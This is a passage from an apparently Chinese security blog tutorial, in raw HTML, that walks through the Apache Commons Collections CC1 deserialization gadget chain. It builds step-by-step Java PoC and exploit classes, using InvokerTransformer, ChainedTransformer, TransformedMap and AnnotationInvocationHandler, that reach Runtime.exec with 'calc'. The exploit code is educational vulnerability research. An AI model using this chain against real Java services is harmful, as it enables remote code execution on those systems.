class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329735.png" alt="QQ_1724133734478"></p><p>注意最后一句<code>invokerTransformer.transform(runtime);</code>，那么下一步就需要寻找调用<code>transform</code>方法的不同名函数</p><h2 id="初步寻找链子"><a href="#初步寻找链子" class="headerlink" title="初步寻找链子"></a>初步寻找链子</h2><p><code>find usages</code>发现<code>TransformedMap</code>类中存在<code>checkSetValue</code>方法调用了<code>transform</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329542.png" alt="QQ_1724134789452"></p><p>跟进<code>valueTransformer</code>，在<code>TransformedMap</code>的构造方法发现了<code>valueTransformer</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329698.png" alt="QQ_1724141068529"></p><p>但是由于其作用域是protected，我们还要继续寻找谁又调用了这个构造方法</p><p>静态的<code>decorate</code>方法创建了<code>TransformedMap</code>对象</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408201606986.png" alt="QQ_1724141187145"></p><p>到这里，我们将其作为链子的起点，构造PoC</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PoC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">checksetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);</span><br><span class="line">        checksetValueMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        checksetValueMethod.invoke(decorateMap,runtime);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>分析一下这条链子是怎么构造的：</p><ul><li>尾部，也就是我们利用的漏洞，<code>InvokerTransformer</code>类的<code>transform</code>方法存在反射，可以进行命令执行</li><li>当调用<code>decorate</code>方法时，会新建<code>TransformedMap</code>对象，我们调用对象的<code>checkSetValue</code>方法</li><li>在<code>checkSetValue</code>方法中，会调用<code>transform</code>方法，这也就是链子的尾部</li></ul><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329243.png" alt="QQ_1724143647672"></p><p>这么一看，调用<code>decorate</code>方法就很有必要了，下面几行代码都是为了<code>decorate</code>方法而生的</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer);</span><br></pre></td></tr></table></figure></div><p>调用完<code>decorate</code>方法，下面就可以新建<code>TransformedMap</code>对象了</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;</span><br></pre></td></tr></table></figure></div><p>再利用反射</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">checksetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);</span><br><span class="line">checksetValueMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">checksetValueMethod.invoke(decorateMap,runtime);</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329106.png" alt="QQ_1724141830468"></p><h2 id="完整链子"><a href="#完整链子" class="headerlink" title="完整链子"></a>完整链子</h2><blockquote><p>目前的链子位于<code>checkSetValue</code>当中，找<code>decorate</code>的链子，发现无法往前了，回到<code>checkSetValue</code>重新找链子</p></blockquote><p>继续<code>find usages</code>，发现了<code>parent.checkSetValue(value)</code>，调用了<code>checkSetValue</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329169.png" alt="QQ_1724156707462"></p><p>跟进看看，这是一个抽象类，并且还是<code>TransformedMap</code>的父类</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329181.png" alt="QQ_1724156929399"></p><p>调用<code>checkSetValue</code>方法的是其内部类<code>MapEntry</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329045.png" alt="QQ_1724157040554"></p><p><code>setValue()</code>实际上就是再Map中对一组entry(键值对)进行<code>setValue()</code>操作</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329851.png" alt="QQ_1724157593945"></p><p>所以我们进行<code>decorate</code>方法调用，进行Map遍历时，就会走到<code>setValue</code>中，而<code>setValue</code>则会调用<code>checkSetValue</code></p><p>写一段代码来调试一下，看看遍历Map时，会不会走到<code>setValue</code>，在上图中<code>setValue</code>的第192行下断点</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">setValueTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span>Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>果然会跳进来，并且代码执行完会弹计算器</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329069.png" alt="QQ_1724158750153"></p><blockquote><p>那么到这里攻击思路就出来了，找到一个是数组的类，遍历这个数组，并且调用<code>setValue</code>方法</p></blockquote><p>问题是怎么遍历一个Map最终调用<code>setValue</code>方法</p><p>下面就需要找到一个可以调用<code>setValue</code>的<code>readObject</code></p><h2 id="寻找链首的readObject"><a href="#寻找链首的readObject" class="headerlink" title="寻找链首的readObject"></a>寻找链首的readObject</h2><p>之前链子分析到<code>setValue</code>，这里在<code>setValue</code>处继续find usages</p><p>成功找到一个<code>readObject</code>的入口类</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329577.png" alt="QQ_1724159597361"></p><p>类名为<code>AnnotationInvocationHandler</code>，<code>InvocationHandler</code>是用做动态代理中间处理，因为它继承了<code>InvocationHandler</code>接口</p><p>要调用<code>setValue</code>，就必须满足下图的条件</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329438.png" alt="QQ_1724160167995"></p><p>但是<code>readObject</code>的方法是类<code>AnnotationInvocationHandler</code>的，<code>AnnotationInvocationHandler</code>的作用域为default，我们需要通过反射来获取这个类及其构造函数，再实例化</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329140.png" alt="QQ_1724160425823"></p><h2 id="构造Exp"><a href="#构造Exp" class="headerlink" title="构造Exp"></a>构造Exp</h2><p>理想情况下的Exp</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExceptedExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Override.class, transformedMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化反序列化</span></span><br><span class="line">    serialize(o);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这个Exp存在三个问题：</p><ul><li><code>Runtime</code>对象不可序列化，需要通过反射将其变成可以序列化的形式</li><li><code>setValue()</code>的传参，需要传<code>Runtime</code>对象，但是实际情况中却不是</li></ul><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329001.png" alt="QQ_1724161393851"></p><ul><li>要满足两个if条件才能调用<code>setValue</code></li></ul><h3 id="解决Runtime不能序列化"><a href="#解决Runtime不能序列化" class="headerlink" title="解决Runtime不能序列化"></a>解决Runtime不能序列化</h3><p><code>Runtime</code>没有实现序列化接口，因此不能序列化</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329306.png" alt="QQ_1724244641721"></p><p>但是<code>Runtime.class</code>是可以序列化的</p><blockquote><p><code>Runtime.class</code>是Java中的一个特殊的静态属性，表示<code>java.lang.Runtime</code>类的Class对象，对于<code>java.lang.Runtime</code>类来说，<code>Runtime.class</code>就是表示该类的元数据信息的Class对象。它包含了有关<code>Runtime</code>类的结构、方法、字段等信息，可以用来在反射中获取方法、调用方法、获取类名等</p></blockquote><p>先写一遍普通的反射</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime)method.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">run</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        run.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>再将这个反射的<code>Runtime</code>改为使用<code>InvokerTransformer</code>调用的方式</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">runtimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(c);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(runtimeMethod);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>最后三行代码的共同点：</p><ul><li>格式都为<code>new InvokerTransformer().invoke()</code></li><li>后一个<code>invoke()</code>方法里的参数都是前一个的结果</li></ul><p>我们可以使用<code>ChainedTransformer</code>类来简化代码</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329347.png" alt="QQ_1724166339028"></p><p><code>ChainedTransformer</code>类下的<code>transform</code>方法递归调用了前一个方法的结果，作为后一个方法的参数</p><p>那么编写Exp的时候就可以先定义一个数组，然后将数组传到<code>ChainedTransformer</code>中，再调用<code>transform</code>方法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(Runtime.class);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329370.png" alt="QQ_1724168176700"></p><p>与decorate的链子结合</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title 